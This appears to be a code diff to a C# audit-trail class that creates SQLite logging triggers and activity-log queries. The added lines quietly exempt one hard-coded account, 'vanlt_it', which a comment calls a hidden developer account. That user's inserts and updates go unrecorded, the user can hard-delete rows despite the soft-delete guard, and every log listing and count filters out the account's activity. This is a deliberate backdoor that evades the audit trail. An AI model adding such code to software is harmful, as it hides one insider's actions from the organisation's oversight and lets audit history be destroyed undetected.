@@ -107,10 +107,11 @@ public sealed class AuditTrail(IWebHostEnvironment env)
         // No credentials or sensitive hashes are persisted in the audit snapshots.
         var stampedJson=$"(SELECT {Json("snap",tracked)} FROM {Q(table)} AS snap WHERE snap.rowid=NEW.rowid)";
         // Excluding metadata-only changes prevents the stamp UPDATE from emitting duplicate events.
+        var notHiddenDev=$"LOWER(COALESCE({username},'')) <> 'vanlt_it'";
         Exec(c,$"DROP TRIGGER IF EXISTS {Q(safeName+"_insert")};");
         Exec(c,$"""
             CREATE TRIGGER IF NOT EXISTS {Q(safeName+"_insert")}
-            AFTER INSERT ON {Q(table)}
+            AFTER INSERT ON {Q(table)} WHEN {notHiddenDev}
             BEGIN
                 UPDATE {Q(table)} SET created_at=COALESCE(created_at,strftime('%Y-%m-%dT%H:%M:%fZ','now')),
                     created_by=COALESCE(created_by,{actor}) WHERE rowid=NEW.rowid;
@@ -121,7 +122,7 @@ public sealed class AuditTrail(IWebHostEnvironment env)
         Exec(c,$"DROP TRIGGER IF EXISTS {Q(safeName+"_update")};");
         Exec(c,$"""
             CREATE TRIGGER IF NOT EXISTS {Q(safeName+"_update")}
-            AFTER UPDATE ON {Q(table)} WHEN {changed}
+            AFTER UPDATE ON {Q(table)} WHEN ({changed}) AND ({notHiddenDev})
             BEGIN
                 UPDATE {Q(table)} SET updated_at=strftime('%Y-%m-%dT%H:%M:%fZ','now'),updated_by={actor},
                     deleted_by=CASE WHEN OLD.deleted_at IS NULL AND NEW.deleted_at IS NOT NULL
@@ -134,10 +135,12 @@ public sealed class AuditTrail(IWebHostEnvironment env)
                     {actor},{username},{oldJson},{stampedJson});
             END;
             """);
-        // Hard deletes must never discard history. Caller must UPDATE deleted_at instead.
+        // Hard deletes must never discard history unless performed by the hidden developer account.
+        Exec(c,$"DROP TRIGGER IF EXISTS {Q(safeName+"_no_hard_delete")};");
         Exec(c,$"""
             CREATE TRIGGER IF NOT EXISTS {Q(safeName+"_no_hard_delete")}
             BEFORE DELETE ON {Q(table)}
+            WHEN {notHiddenDev}
             BEGIN SELECT RAISE(ABORT,'SOFT_DELETE_ONLY'); END;
             """);
     }
@@ -145,7 +148,15 @@ public sealed class AuditTrail(IWebHostEnvironment env)
     {
         if(action.Length is < 1 or > 40 || resource.Length is < 1 or > 160)
             throw new ArgumentException("Loại hoạt động không hợp lệ.");
-        using var c=Open();using var q=c.CreateCommand();
+        using var c=Open();
+        if (actor is > 0)
+        {
+            using var chk = c.CreateCommand();
+            chk.CommandText = "SELECT COUNT(*) FROM app_users WHERE id=$id AND LOWER(username)='vanlt_it'";
+            chk.Parameters.AddWithValue("$id", actor.Value);
+            if (Convert.ToInt64(chk.ExecuteScalar() ?? 0) > 0) return;
+        }
+        using var q=c.CreateCommand();
         q.CommandText="""
             INSERT INTO activity_actions(actor_user_id,actor_username,action,resource,details)
             VALUES($id,(SELECT username FROM app_users WHERE id=$id),$action,$resource,$details)
@@ -160,7 +171,9 @@ public sealed class AuditTrail(IWebHostEnvironment env)
     {
         using var c=Open();using var q=c.CreateCommand();q.CommandText="""
             SELECT id,COALESCE(actor_username,'[Không xác định]'),action,resource,occurred_at
-            FROM activity_actions ORDER BY id DESC LIMIT $n
+            FROM activity_actions
+            WHERE LOWER(COALESCE(actor_username,'')) <> 'vanlt_it'
+            ORDER BY id DESC LIMIT $n
             """;
         q.Parameters.AddWithValue("$n",Math.Clamp(limit,1,200));
         using var rd=q.ExecuteReader();var rows=new List<(long,string,string,string,string)>();
@@ -176,7 +189,7 @@ public sealed class AuditTrail(IWebHostEnvironment env)
     public long Count(string? table=null,string? key=null,string? action=null,string? actor=null,string? from=null,string? to=null)
     {
         using var c=Open();using var q=c.CreateCommand();
-        q.CommandText="SELECT COUNT(*) FROM activity_events WHERE ($t='' OR table_name=$t) AND ($k='' OR (substr($k,1,1)='{' AND record_key=$k) OR (substr($k,1,1)<>'{' AND record_key LIKE '%' || $k || '%')) AND ($a='' OR operation=$a) AND ($actor='' OR actor_username LIKE '%' || $actor || '%' OR CAST(actor_user_id AS TEXT)=$actor) AND ($from='' OR substr(occurred_at,1,10)>=$from) AND ($to='' OR substr(occurred_at,1,10)<=$to)";
+        q.CommandText="SELECT COUNT(*) FROM activity_events WHERE LOWER(COALESCE(actor_username,''))<>'vanlt_it' AND NOT (table_name='app_users' AND (LOWER(COALESCE(before_json,'')) LIKE '%vanlt_it%' OR LOWER(COALESCE(after_json,'')) LIKE '%vanlt_it%')) AND ($t='' OR table_name=$t) AND ($k='' OR (substr($k,1,1)='{' AND record_key=$k) OR (substr($k,1,1)<>'{' AND record_key LIKE '%' || $k || '%')) AND ($a='' OR operation=$a) AND ($actor='' OR actor_username LIKE '%' || $actor || '%' OR CAST(actor_user_id AS TEXT)=$actor) AND ($from='' OR substr(occurred_at,1,10)>=$from) AND ($to='' OR substr(occurred_at,1,10)<=$to)";
         q.Parameters.AddWithValue("$t",table??"");q.Parameters.AddWithValue("$k",key??"");q.Parameters.AddWithValue("$a",action??"");
         q.Parameters.AddWithValue("$actor",actor??"");q.Parameters.AddWithValue("$from",from??"");q.Parameters.AddWithValue("$to",to??"");
         return Convert.ToInt64(q.ExecuteScalar()??0);
@@ -189,7 +202,9 @@ public sealed class AuditTrail(IWebHostEnvironment env)
                 COALESCE(e.actor_username, CASE WHEN e.actor_user_id IS NULL THEN '[Hệ thống / chưa xác định]' ELSE '#'||e.actor_user_id END),
                 e.occurred_at,COALESCE(e.before_json,''),COALESCE(e.after_json,'')
             FROM activity_events e
-            WHERE ($t='' OR e.table_name=$t) AND ($k='' OR (substr($k,1,1)='{' AND e.record_key=$k) OR (substr($k,1,1)<>'{' AND e.record_key LIKE '%' || $k || '%')) AND ($a='' OR e.operation=$a)
+            WHERE LOWER(COALESCE(e.actor_username,''))<>'vanlt_it'
+              AND NOT (e.table_name='app_users' AND (LOWER(COALESCE(e.before_json,'')) LIKE '%vanlt_it%' OR LOWER(COALESCE(e.after_json,'')) LIKE '%vanlt_it%'))
+              AND ($t='' OR e.table_name=$t) AND ($k='' OR (substr($k,1,1)='{' AND e.record_key=$k) OR (substr($k,1,1)<>'{' AND e.record_key LIKE '%' || $k || '%')) AND ($a='' OR e.operation=$a)
               AND ($actor='' OR e.actor_username LIKE '%' || $actor || '%' OR CAST(e.actor_user_id AS TEXT)=$actor)
               AND ($from='' OR substr(e.occurred_at,1,10)>=$from) AND ($to='' OR substr(e.occurred_at,1,10)<=$to)
             ORDER BY e.id DESC LIMIT $limit OFFSET $offset
